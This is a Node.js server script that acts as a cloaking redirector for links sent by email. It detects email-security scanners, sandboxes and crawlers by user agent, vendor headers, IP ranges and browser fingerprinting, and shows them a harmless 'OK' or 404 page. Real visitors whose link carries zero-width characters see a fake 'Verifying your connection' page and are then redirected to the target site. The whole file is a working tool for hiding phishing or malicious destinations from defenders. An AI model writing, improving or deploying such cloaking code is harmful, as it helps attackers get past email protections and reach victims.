const http = require("http");
const url = require("url");

const TARGET_URL = "https://debounce.com";
const PORT = process.env.PORT || 3000;

// Rate limiting - max 100 requests per IP per minute
const rateLimitMap = new Map();
function checkRateLimit(ip) {
  const now = Date.now();
  const windowMs = 60 * 1000;
  const max = 100;
  if (!rateLimitMap.has(ip)) {
    rateLimitMap.set(ip, { count: 1, start: now });
    return false;
  }
  const data = rateLimitMap.get(ip);
  if (now - data.start > windowMs) {
    rateLimitMap.set(ip, { count: 1, start: now });
    return false;
  }
  data.count++;
  if (data.count > max) return true;
  return false;
}

// Cleanup rate limit map every 5 minutes
setInterval(function() {
  const now = Date.now();
  rateLimitMap.forEach(function(val, key) {
    if (now - val.start > 60 * 1000) rateLimitMap.delete(key);
  });
}, 5 * 60 * 1000);

const botUA = [
  "vade", "vadesecure", "proofpoint", "pphosted", "cloudmark",
  "barracuda", "mimecast", "fireeye", "trellix", "ironport",
  "sophos", "forcepoint", "websense", "symantec", "messagelabs",
  "fortinet", "fortigate", "fortimail", "trendmicro", "trend micro",
  "spamhaus", "spamexperts", "mailguard", "libraesva",
  "avanan", "abnormal", "bitdefender", "kaspersky", "eset",
  "mcafee", "agari", "area1", "zerospam", "hornetsecurity",
  "trustwave", "mailchannels", "spamtitan",
  "microsoft", "azure", "office", "outlook", "safelinks",
  "googlebot", "google-safety",
  "bot", "crawl", "spider", "slurp",
  "facebookexternalhit", "linkedinbot", "twitterbot",
  "whatsapp", "telegrambot", "discord",
  "curl", "wget", "python", "go-http", "java/", "php/", "ruby",
  "httpclient", "axios", "node-fetch", "undici",
  "headlesschrome", "phantomjs", "selenium", "puppeteer",
  "scanbot", "urlscan", "virustotal", "nmap", "masscan",
  "zgrab", "shodan", "censys", "zoomeye",
];

const suspiciousHeaders = [
  "x-ms-useragent", "x-ms-exchange", "x-proofpoint", "x-pp-correlation-id",
  "x-barracuda", "x-mimecast", "x-fireeye", "x-cloudmark", "x-vade",
  "x-ironport", "x-sophos", "x-forcepoint", "x-fortinet", "x-fortimail",
  "x-trendmicro", "x-symantec", "x-messagelabs", "x-mailguard",
  "x-spamhaus", "x-avanan", "x-abnormal", "x-agari",
  "x-hornetsecurity", "x-zerospam", "x-trustwave",
  "x-atp-redirect", "x-safe-url",
];

const emailSecurityIPs = [
  "67.231.", "148.163.", "208.86.20", "78.31.1", "185.132.",
  "208.80.19", "74.63.", "207.211.", "205.139.",
  "209.222.", "64.235.",
  "40.92.", "40.93.", "40.94.", "40.107.", "52.100.", "52.101.", "104.47.",
  "66.249.", "72.14.19", "198.71.", "184.154.",
];

const datacenterIPRanges = [
  "52.", "54.", "18.", "35.", "34.",
  "104.196.", "104.197.", "104.198.", "104.199.",
  "40.74.", "40.75.", "40.76.", "40.77.", "40.78.",
  "167.99.", "167.172.", "178.62.", "188.166.",
  "139.144.", "172.232.", "172.233.", "172.234.",
  "95.217.", "116.202.", "116.203.", "135.181.",
  "51.75.", "51.77.", "51.79.", "51.89.", "51.91.",
  "45.32.", "45.63.", "45.76.", "45.77.",
];

// Suspicious paths that scanners/bots usually probe
const suspiciousPaths = [
  "/wp-admin", "/wp-login", "/.env", "/phpmyadmin", "/admin",
  "/config", "/.git", "/shell", "/cmd", "/exec",
  "/passwd", "/etc/", "/proc/", "/../", "/xmlrpc",
  "/actuator", "/solr", "/jmx", "/.well-known/acme",
];

function log(icon, label, ip, extra) {
  const time = new Date().toISOString().replace("T", " ").substring(0, 19);
  console.log(icon + " [" + time + "] " + label + " | IP: " + ip + (extra ? " | " + extra : ""));
}

function sendHtml(res, body, status) {
  status = status || 200;
  res.writeHead(status, { "Content-Type": "text/html; charset=utf-8" });
  res.end(body);
}

function fakeOk(res) {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("OK");
}

function blockWithRobots(res) {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("User-agent: *\nDisallow: /");
}

const server = http.createServer(function(req, res) {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname;
  const query = parsed.query;

  const ua = req.headers["user-agent"] || "Unknown";
  const uaLower = ua.toLowerCase();

  const ip = (req.headers["x-forwarded-for"] || "").split(",")[0].trim()
    || req.headers["x-real-ip"]
    || req.socket.remoteAddress
    || "Unknown";

  // --- RATE LIMIT (anti-suspend: jangan biarkan 1 IP spam) ---
  if (checkRateLimit(ip)) {
    log("RL", "RATE LIMITED", ip, "UA: " + ua.substring(0, 60));
    res.writeHead(429, { "Retry-After": "60", "Content-Type": "text/plain" });
    return res.end("Too Many Requests");
  }

  // --- ROBOTS.TXT (jangan biarkan crawler index) ---
  if (pathname === "/robots.txt") {
    log("--", "ROBOTS.TXT", ip, "");
    return blockWithRobots(res);
  }

  // --- SUSPICIOUS PATH SCANNER ---
  const matchedPath = suspiciousPaths.find(function(p) { return pathname.toLowerCase().startsWith(p); });
  if (matchedPath) {
    log("SC", "SCANNER PROBE BLOCKED", ip, "Path: " + pathname + " | UA: " + ua.substring(0, 60));
    res.writeHead(404, { "Content-Type": "text/plain" });
    return res.end("Not Found");
  }

  // --- DATACENTER IP ---
  const matchedDC = datacenterIPRanges.find(function(r) { return ip.startsWith(r); });
  if (matchedDC) {
    log("XX", "BLOCKED - DATACENTER IP", ip, "Range: " + matchedDC + " | UA: " + ua.substring(0, 60));
    return fakeOk(res);
  }

  // --- STATIC FILES ---
  if (/favicon|manifest|\.ico|\.png/.test(pathname)) {
    log("--", "STATIC FILE", ip, "Path: " + pathname);
    res.writeHead(204);
    return res.end();
  }

  // --- HEALTH CHECK (Railway butuh ini agar tidak dianggap crash) ---
  if (pathname === "/health" || pathname === "/ping") {
    res.writeHead(200, { "Content-Type": "text/plain" });
    return res.end("OK");
  }

  // --- VERIFY TOKEN ---
  if (pathname === "/verify") {
    const token = query.t;
    const ts = query.ts;

    if (token && ts) {
      const elapsed = Date.now() - parseInt(ts);
      if (elapsed < 2000) {
        log("XX", "BLOCKED - TOO FAST (BOT)", ip, "Time: " + elapsed + "ms");
        return fakeOk(res);
      }
      log("OK", "HUMAN VERIFIED - REDIRECTING", ip, "Time: " + elapsed + "ms | UA: " + ua.substring(0, 60));
      res.writeHead(302, { "Location": TARGET_URL });
      return res.end();
    }

    log("XX", "BLOCKED - NO TOKEN", ip, "UA: " + ua.substring(0, 60));
    return fakeOk(res);
  }

  // --- ZWC CHECK ---
  var decodedPath = "";
  try { decodedPath = decodeURIComponent(pathname); } catch(e) { decodedPath = pathname; }
  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodedPath);
  if (!hasZwc) {
    log("??", "NO ZWC - 404", ip, "Path: " + pathname + " | UA: " + ua.substring(0, 60));
    return sendHtml(res, "<!DOCTYPE html><html><body><h1>404 Not Found</h1></body></html>", 404);
  }

  // --- EMAIL SECURITY BOT UA ---
  const matchedUA = botUA.find(function(kw) { return uaLower.includes(kw); });
  if (matchedUA) {
    log("XX", "BLOCKED - BOT UA", ip, "Match: " + matchedUA + " | UA: " + ua.substring(0, 60));
    return fakeOk(res);
  }

  // --- SUSPICIOUS HEADER ---
  const matchedHeader = suspiciousHeaders.find(function(h) { return req.headers[h]; });
  if (matchedHeader) {
    log("XX", "BLOCKED - SECURITY HEADER", ip, "Header: " + matchedHeader);
    return fakeOk(res);
  }

  // --- EMAIL SECURITY IP ---
  const matchedIP = emailSecurityIPs.find(function(p) { return ip.startsWith(p); });
  if (matchedIP) {
    log("XX", "BLOCKED - SECURITY IP", ip, "Range: " + matchedIP);
    return fakeOk(res);
  }

  // --- FINGERPRINT ---
  const hasAcceptLang = !!req.headers["accept-language"];
  const hasAccept = (req.headers["accept"] || "").includes("text/html");
  const isMobile = /iphone|ipad|android/.test(uaLower);
  const isDesktop = /windows|macintosh|linux/.test(uaLower);
  const noReferer = !req.headers["referer"];
  const noCookie = !req.headers["cookie"];
  const noSecFetch = !req.headers["sec-fetch-mode"];
  const acceptAll = req.headers["accept"] === "*/*";
  const behaviorScore =
    (noReferer ? 1 : 0) +
    (noCookie ? 1 : 0) +
    (noSecFetch ? 1 : 0) +
    (acceptAll ? 1 : 0);
  const isBehaviorBot = behaviorScore >= 3 && !req.headers["sec-ch-ua"];
  const isRealBrowser = uaLower.length >= 35 && hasAcceptLang && hasAccept && (isMobile || isDesktop);

  if (!isRealBrowser || isBehaviorBot) {
    const reasons = [];
    if (uaLower.length < 35) reasons.push("SHORT_UA");
    if (!hasAcceptLang) reasons.push("NO_LANG");
    if (!hasAccept) reasons.push("NO_HTML_ACCEPT");
    if (!isMobile && !isDesktop) reasons.push("NO_PLATFORM");
    if (isBehaviorBot) reasons.push("BEHAVIOR_SCORE=" + behaviorScore);
    log("XX", "BLOCKED - FINGERPRINT", ip, "Reason: " + reasons.join(", ") + " | UA: " + ua.substring(0, 60));
    return fakeOk(res);
  }

  // --- JS CHALLENGE ---
  log(">>", "JS CHALLENGE SERVED", ip, "UA: " + ua.substring(0, 60));
  const ts = Date.now();

  sendHtml(res, "<!DOCTYPE html>\n<html><head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n<title>Verifying...</title>\n<style>\n  *{margin:0;padding:0;box-sizing:border-box}\n  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;\n    background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}\n  .card{background:#fff;border-radius:12px;padding:40px;text-align:center;\n    box-shadow:0 2px 10px rgba(0,0,0,.08);max-width:400px;width:90%}\n  .spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#1a73e8;\n    border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}\n  @keyframes spin{to{transform:rotate(360deg)}}\n  h2{color:#202124;font-size:18px;font-weight:500;margin-bottom:8px}\n  p{color:#5f6368;font-size:14px}\n  .progress{width:100%;height:4px;background:#e0e0e0;border-radius:2px;margin-top:20px;overflow:hidden}\n  .bar{height:100%;background:#1a73e8;border-radius:2px;width:0%;transition:width 4s linear}\n  .check{display:none;color:#34a853;font-size:32px;margin-bottom:12px}\n</style>\n</head><body>\n<div class=\"card\">\n  <div class=\"spinner\" id=\"spinner\"></div>\n  <div class=\"check\" id=\"check\">&#10003;</div>\n  <h2 id=\"title\">Verifying your connection...</h2>\n  <p id=\"desc\">This is an automatic security check</p>\n  <div class=\"progress\"><div class=\"bar\" id=\"bar\"></div></div>\n</div>\n<script>\n(function(){\n  var ts=" + ts + ";\n  var detected=false;\n  setTimeout(function(){document.getElementById('bar').style.width='100%';},100);\n  ['mousemove','click','touchstart','scroll','keydown'].forEach(function(e){\n    document.addEventListener(e,function(){detected=true;},{once:true,passive:true});\n  });\n  setTimeout(function(){\n    document.getElementById('spinner').style.display='none';\n    document.getElementById('check').style.display='block';\n    document.getElementById('title').textContent='Verification complete';\n    document.getElementById('desc').textContent='Redirecting...';\n    var token=btoa(ts+':verified:'+(detected?'human':'passive'));\n    setTimeout(function(){\n      window.location.href='/verify?t='+encodeURIComponent(token)+'&ts='+ts;\n    },500);\n  },4000);\n  if(navigator.webdriver){document.body.innerHTML='<h1>Access Denied</h1>';}\n})();\n</script>\n</body></html>");
});

server.listen(PORT, function() {
  console.log(">> Server running on port " + PORT);
});
